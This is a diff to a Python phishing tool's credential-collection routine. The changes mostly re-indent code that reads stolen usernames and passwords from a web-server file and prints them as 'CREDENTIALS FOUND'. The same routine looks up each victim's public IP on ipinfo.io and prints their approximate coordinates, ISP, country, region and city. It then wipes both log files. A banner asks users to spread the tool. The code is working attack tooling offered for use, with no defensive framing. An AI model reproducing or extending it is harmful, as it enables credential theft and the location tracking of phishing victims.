@@ -142,36 +142,36 @@ def waitCreds():
 
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
-        if len(lines) != 0:
-            print ('======================================================================'.format(RED, END))
-            print (' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
-            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-            print ('======================================================================'.format(RED, END))
-            print (' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END))
+            if len(lines) != 0:
+                print ('======================================================================'.format(RED, END))
+                print (' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+                print ('======================================================================'.format(RED, END))
+                print (' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END))
 
         creds.close()
 
 
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
-        if len(lines) != 0:
-            ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
-            resp = urlopen('https://ipinfo.io/%s/json' % ip)
-            ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
-            if 'bogon' in ipinfo:
-                  print ('======================================================================'.format(RED, END))
-                  print (' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
-            else:
-                matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
-                latitude = matchObj.group(1)
-                longitude = matchObj.group(2)
+            if len(lines) != 0:
+                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
+                resp = urlopen('https://ipinfo.io/%s/json' % ip)
+                ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
+                if 'bogon' in ipinfo:
+                    print ('======================================================================'.format(RED, END))
+                    print (' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                else:
+                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
+                    latitude = matchObj.group(1)
+                    longitude = matchObj.group(2)
+                    print ('======================================================================'.format(RED, END))
+                    print (' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                    print (' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude))
+                    print (' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country']))
+                    print (' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city']))
+                system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                 print ('======================================================================'.format(RED, END))
-                print (' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
-                print (' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude))
-                print (' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country']))
-                print (' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city']))
-            system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-            print ('======================================================================'.format(RED, END))
 
         creds.close()
 
